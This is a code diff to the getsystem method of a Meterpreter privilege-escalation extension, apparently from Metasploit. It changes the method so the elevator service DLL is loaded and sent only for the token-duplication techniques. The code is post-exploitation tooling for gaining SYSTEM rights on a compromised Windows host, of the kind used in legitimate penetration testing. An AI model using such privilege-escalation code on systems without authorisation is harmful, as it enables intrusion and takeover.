@@ -43,33 +43,39 @@ class Priv < Extension
   def getsystem( technique=0 )
     request = Packet.create_request( 'priv_elevate_getsystem' )
 
-    elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
+    # We only need the elevate DLL for when we're invoking the tokendup
+    # method, which we'll only use if required (ie. trying all or when
+    # that metdho is asked for explicitly)
+    if [0, 3].include?(technique)
+      elevator_name = Rex::Text.rand_text_alpha_lower( 6 )
 
-    elevator_path = nil
-    client.binary_suffix.each { |s|
-      elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
-      if !elevator_path.nil?
-        break
-      end
-    }
-    if elevator_path.nil?
-      elevators = ""
+      elevator_path = nil
       client.binary_suffix.each { |s|
-        elevators << "elevator.#{s}, "
+        elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
+        if !elevator_path.nil?
+          break
+        end
       }
-      raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
+      if elevator_path.nil?
+        elevators = ""
+        client.binary_suffix.each { |s|
+          elevators << "elevator.#{s}, "
+        }
+        raise RuntimeError, "#{elevators.chomp(', ')} not found", caller
+      end
+
+      elevator_data = ""
+
+      ::File.open( elevator_path, "rb" ) { |f|
+        elevator_data += f.read( f.stat.size )
+      }
+
+      request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
+      request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
+      request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
     end
 
-    elevator_data = ""
-
-    ::File.open( elevator_path, "rb" ) { |f|
-      elevator_data += f.read( f.stat.size )
-    }
-
     request.add_tlv( TLV_TYPE_ELEVATE_TECHNIQUE, technique )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data )
-    request.add_tlv( TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length )
 
     # as some service routines can be slow we bump up the timeout to 90 seconds
     response = client.send_request( request, 90 )
